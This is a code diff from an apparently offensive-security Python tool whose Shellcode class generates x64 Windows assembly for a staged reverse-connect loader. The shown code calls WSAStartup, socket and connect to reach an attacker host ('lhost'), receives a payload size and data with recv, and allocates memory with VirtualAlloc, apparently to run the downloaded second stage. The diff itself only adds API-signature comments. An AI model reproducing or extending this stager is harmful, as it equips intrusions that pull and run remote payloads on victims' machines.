@@ -122,12 +122,21 @@ class Shellcode():
         sin_addr = hex(convert.ip_str_to_inet_addr(self.lhost))
 
         src = f"""
+; int WSAStartup(
+;   [in]  WORD      wVersionRequired,
+;   [out] LPWSADATA lpWSAData
+; );
 call_WSAStartup:
     mov rcx, 0x202
     lea rdx, [rbp - {self.storage_offsets['wsaData']}]
     mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
     call rax
 
+; SOCKET WSAAPI socket(
+;   [in] int af,
+;   [in] int type,
+;   [in] int protocol
+; );
 call_socket:
     mov rcx, {ws2def.AF_INET}
     xor rdx, rdx
@@ -137,6 +146,11 @@ call_socket:
     call rax
     mov [rbp - {self.storage_offsets['sockfd']}], rax
 
+; int WSAAPI connect(
+;   [in] SOCKET         s,
+;   [in] const sockaddr *name,
+;   [in] int            namelen
+; );
 call_connect:
     mov rcx, rax
     mov r8, {ctypes.sizeof(ws2def.sockaddr)}
@@ -151,6 +165,12 @@ call_connect:
     xor rdx, rdx
     mov [rbp - {self.storage_offsets['lpvShellcode']}], rdx
 
+; int recv(
+;   [in]  SOCKET s,
+;   [out] char   *buf,
+;   [in]  int    len,
+;   [in]  int    flags
+; );
     lea rdx, [rbp - {self.storage_offsets['dwSize']}]
     mov r8, 0x08 
 call_recv:
@@ -162,6 +182,12 @@ call_recv:
     cmp rax, 0x10
     jg download_complete
 
+; LPVOID VirtualAlloc(
+;   [in, optional] LPVOID lpAddress,
+;   [in]           SIZE_T dwSize,
+;   [in]           DWORD  flAllocationType,
+;   [in]           DWORD  flProtect
+; );
 call_VirtualAlloc:
     mov rcx, [rbp - {self.storage_offsets['lpvShellcode']}]
     mov rdx, [rbp - {self.storage_offsets['dwSize']}]
